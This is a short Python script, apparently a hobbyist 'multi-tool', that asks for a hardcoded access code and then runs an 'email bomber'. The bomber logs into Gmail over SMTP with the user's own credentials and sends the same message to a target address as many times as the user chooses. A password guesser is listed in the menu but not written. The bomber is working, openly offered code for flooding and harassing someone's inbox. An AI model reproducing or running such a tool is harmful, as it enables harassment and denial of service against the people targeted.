import smtplib
import time

a=str(input('Enter First Name Here: '))
b=str(input('Enter Last Name Here: '))

while True:
	c=str(input('Enter Auth Code: '))
	if c == 'MuffinBomb12':
	 print('Authenticating...')
	 time.sleep(2)
	 d=str(input('Press Enter'))
	 print('Logged in as',a,'',b,'')
	 break
  
else:
  print('Authenticating...')
  time.sleep(2)
  print('Rerun code with correct authentification.')
  time.sleep(1)
  e=str(input('Press Enter'))

banner2 = """
+++++++++++++++++++++++++++++++++++++++
|       MuffinMultiTool         |
|          Options:             |
+++++++++++++++++++++++++++++++++++++++
(1) Muffin's Email Bomber
(2) Experimental Password Guesser
"""

print(banner2,'\n')
time.sleep(0.5)
f=str(input('Enter Option: '))

if f == '1':
	print('Loading MuffinBomb..')
	time.sleep(2)
	
	
	
banner = """
+++++++++++++++++++++++++++++++++++++++++++
|       Author : MuffinMxnYT               |
|       Channel : MuffinMxn               |
+++++++++++++++++++++++++++++++++++++++++++
        Enable the permissin here 
https://myaccount.google.com/lesssecureapps
"""
print(banner,'\n')
sender_email = input("Enter your email id: ")
password = input("Enter your password: ")
rec_email = input("Enter the target's email id: ") 
message = input("Enter a message for your target\n \n")
bombsize = input("Enter the bomb size: ")
print(bombsize)
i = 0
agree = input("Are you sure: ") 
if agree.lower() == 'y':
    server = smtplib.SMTP('smtp.gmail.com',587)
    server.starttls()
    server.login(sender_email,password)
    print(" [ + ]Authenticating........")
    print(f"{bombsize} 💣 have been launched ")
    while i != int(bombsize):
        server.sendmail(sender_email, rec_email, message)
        print(f"{i+1} Bomb 💥")
        i += 1
else:
    exit()
